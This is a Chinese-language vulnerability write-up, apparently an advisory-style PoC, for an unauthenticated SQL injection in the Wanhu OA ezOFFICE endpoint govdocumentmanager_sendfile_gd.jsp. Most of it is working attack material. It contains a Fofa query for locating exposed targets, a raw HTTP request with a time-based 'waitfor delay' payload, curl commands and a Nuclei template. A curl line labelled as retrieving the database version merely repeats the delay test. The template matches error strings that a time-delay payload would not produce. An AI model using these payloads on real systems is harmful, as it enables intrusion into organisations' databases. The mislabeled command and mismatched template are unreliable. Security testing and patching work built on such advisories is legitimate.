# 万户OA govdocumentmanager_sendfile_gd.jsp SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 万户OA govdocumentmanager_sendfile_gd.jsp SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 组件名称 | 万户OA ezOFFICE |
| 影响版本 | 万户OA |
| 漏洞日期 | 2026-03-28 |

## 漏洞概述

万户OA ezoffice是万户网络协同办公产品。万户ezOFFICE modules/govoffice/gov_documentmanager/govdocumentmanager_sendfile_gd.jsp 接口存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

## Fofa查询语法

```
app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"
```

## 漏洞复现

### POC

```http
GET /defaultroot/modules/govoffice/govdocumentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1;waitfor delay'0:0:4'-- HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
```

### 特征

- 请求路径：`/defaultroot/modules/govoffice/govdocumentmanager/govdocumentmanager_sendfile_gd.jsp;.js`
- 参数：`sendFileId`
- 利用方式：时间盲注（waitfor delay）
- 响应延迟：4秒

### 验证命令

```bash
# 时间盲注测试（延迟4秒）
curl -v "http://TARGET/defaultroot/modules/govoffice/govdocumentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1;waitfor%20delay'0:0:4'--"

# 获取数据库版本
curl -v "http://TARGET/defaultroot/modules/govoffice/govdocumentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1;waitfor%20delay'0:0:4'--"
```

## Nuclei 检测脚本

```yaml
id: wanhu-oa-govdocumentmanager-sendfile-sql

info:
  name: Wanhu OA govdocumentmanager_sendfile_gd.jsp SQL Injection
  author: 实战安全研究
  severity: critical
  description: 万户OA govdocumentmanager_sendfile_gd.jsp 接口存在SQL注入漏洞
  reference:
    - https://blog.wuyaoxuexi.cn
  tags: wanhu,ezoffice,sql-injection

requests:
  - method: GET
    path:
      - "{{BaseURL}}/defaultroot/modules/govoffice/govdocumentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1;waitfor%20delay'0:0:4'--"
    matchers:
      - type: word
        words:
          - "java.sql"
          - "SQLException"
          - "com.microsoft.sqlserver"
        part: body
        case-insensitive: true
```

## 漏洞修复建议

1. 建议联系厂商打补丁或升级版本。
2. 增加Web应用防火墙防护。
3. 关闭互联网暴露面或接口设置访问权限。
